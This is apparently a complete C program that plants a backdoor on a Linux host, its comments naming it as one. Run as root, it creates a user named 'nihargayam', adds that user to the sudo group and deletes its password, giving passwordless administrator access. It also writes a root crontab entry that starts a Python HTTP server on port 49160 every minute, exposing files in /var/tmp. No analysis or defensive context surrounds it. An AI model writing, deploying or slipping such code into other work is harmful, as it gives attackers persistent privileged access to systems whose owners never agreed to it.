#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>

#define BACKDOOR_USER "nihargayam"
#define CRONTAB_CMD "cd /var/tmp && python3 -m http.server 49160 >> /dev/null 2>&1"
#define CRONTAB_LINE "* * * * * " CRONTAB_CMD
#define TMPFILE "/tmp/.cron_tmp"

void ensure_crontab_line() {
    FILE *fp;
    int found = 0;

    // Dump current root crontab to temp file
    system("crontab -l > " TMPFILE " 2>/dev/null");

    // Check if line already exists
    fp = fopen(TMPFILE, "r");
    if (fp != NULL) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, CRONTAB_CMD)) {
                found = 1;
                break;
            }
        }
        fclose(fp);
    }

    // If not found, append the line
    if (!found) {
        fp = fopen(TMPFILE, "a");
        if (fp != NULL) {
            fprintf(fp, "%s\n", CRONTAB_LINE);
            fclose(fp);
            system("crontab " TMPFILE);
        }
    }

    // Clean up
    remove(TMPFILE);
}

int main() {
    // Ensure backdoor user exists
    struct passwd *pwd = getpwnam(BACKDOOR_USER);
    if (pwd == NULL) {
        system("/usr/sbin/useradd -m " BACKDOOR_USER);
        system("/usr/sbin/usermod -aG sudo " BACKDOOR_USER);
        system("/usr/bin/passwd -d " BACKDOOR_USER);
    }

    // Ensure the crontab line exists
    ensure_crontab_line();

    return 0;
}
